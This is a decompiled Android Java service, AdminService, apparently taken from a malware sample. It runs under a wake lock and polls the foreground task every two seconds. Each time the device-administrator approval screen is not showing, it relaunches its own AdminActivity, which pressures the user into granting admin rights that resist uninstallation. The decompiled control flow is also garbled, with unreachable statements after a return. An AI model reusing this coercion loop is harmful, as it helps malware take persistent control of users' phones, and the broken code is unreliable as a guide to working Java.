package delete.off;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.IntentService;
import android.content.ComponentName;
import android.content.Intent;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;
import java.io.PrintStream;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class AdminService
  extends IntentService
{
  public static AtomicBoolean work = new AtomicBoolean(false);
  
  public AdminService()
  {
    super("");
  }
  
  protected void onHandleIntent(Intent paramIntent)
  {
    PowerManager.WakeLock localWakeLock = ((PowerManager)getSystemService("power")).newWakeLock(1, "admin");
    localWakeLock.acquire();
    paramIntent = paramIntent.getAction();
    System.out.println("onHandleIntent() action: " + paramIntent);
    if (paramIntent == null) {}
    for (;;)
    {
      try
      {
        paramIntent = (ActivityManager)getSystemService("activity");
        boolean bool = work.get();
        if (bool) {
          continue;
        }
      }
      catch (Exception paramIntent)
      {
        Object localObject;
        paramIntent.printStackTrace();
        continue;
      }
      localWakeLock.release();
      return;
      localObject = (ActivityManager.RunningTaskInfo)paramIntent.getRunningTasks(1).get(0);
      System.out.println("-----------------------------------");
      System.out.println("topActivity: " + ((ActivityManager.RunningTaskInfo)localObject).topActivity);
      System.out.println("topActivity.getPackageName(): " + ((ActivityManager.RunningTaskInfo)localObject).topActivity.getPackageName());
      System.out.println("topActivity.getClassName(): " + ((ActivityManager.RunningTaskInfo)localObject).topActivity.getClassName());
      System.out.println("===================================");
      if (!((ActivityManager.RunningTaskInfo)localObject).topActivity.getClassName().endsWith("DeviceAdminAdd"))
      {
        System.out.println("start admin");
        if (work.get())
        {
          localObject = new Intent(this, AdminActivity.class);
          ((Intent)localObject).setAction("up");
          ((Intent)localObject).addFlags(268435456);
          ((Intent)localObject).addFlags(536870912);
          startActivity((Intent)localObject);
        }
      }
      SystemClock.sleep(2000L);
    }
  }
}
